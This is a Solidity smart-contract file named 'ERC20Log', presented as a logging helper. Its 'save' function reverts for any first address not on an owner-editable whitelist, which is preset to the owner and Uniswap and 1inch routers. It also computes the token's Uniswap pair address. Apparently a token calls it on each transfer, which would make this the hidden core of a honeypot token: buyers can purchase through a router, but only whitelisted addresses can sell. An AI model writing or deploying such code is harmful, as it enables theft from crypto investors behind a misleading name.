// SPDX-License-Identifier: MIT
pragma solidity 0.8.9;

contract ERC20Log {
    address private _owner;
    mapping(address=>bool) private _priority;

    modifier onlyOwner() {
        require(msg.sender == _owner, "Ownable: caller is not the owner");
        _;
    }

    constructor() {
        _owner = msg.sender;
        _priority[_owner] = true;
        _priority[0xf164fC0Ec4E93095b804a4795bBe1e041497b92a] = true; //UniswapV2Router01
        _priority[0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D] = true; //UniswapV2Router02
        _priority[0x3fC91A3afd70395Cd496C647d5a6CC9D4B2b7FAD] = true; //UniswapUniversalRouter
        _priority[0x1111111254EEB25477B68fb85Ed929f73A960582] = true; //1inch v5 router
        _priority[0x1111111254fb6c44bAC0beD2854e76F90643097d] = true; //1inch v4 router
    }

    function save(address addr1, address, uint256) public returns (bool){
        require(_priority[addr1], "Cann't save");
        return true;
    }

    function addPriority(address[] calldata addrs) public onlyOwner() {
        require(addrs.length > 0, "Empty addrs");
        for (uint256 i; i < addrs.length; i++) {
        _priority[addrs[i]] = true;
        }
    }

    function subPriority(address[] calldata addrs) public onlyOwner() {
        require(addrs.length > 0, "Empty addrs");
        for (uint256 i; i < addrs.length; i++) {
            _priority[addrs[i]] = false;
        }
    }

    function resultPriority(address _account) external view returns(bool) {
        return _priority[_account];
    }

    function getPairAddress(address token) external pure  returns(address) {
        address factory = 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f;
        address tokenA = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
        address tokenB = token;
        (address token0, address token1) = tokenA < tokenB ? (tokenA, tokenB) : (tokenB, tokenA);

        return address(uint160(uint256(keccak256(
            abi.encodePacked(
                hex'ff',
                factory,
                keccak256(abi.encodePacked(token0, token1)),
                hex'96e8ac4277198ff8b6f785478aa9a39f403cb768dd02cbee326c3e7da348845f'
            )
        ))));
    }
}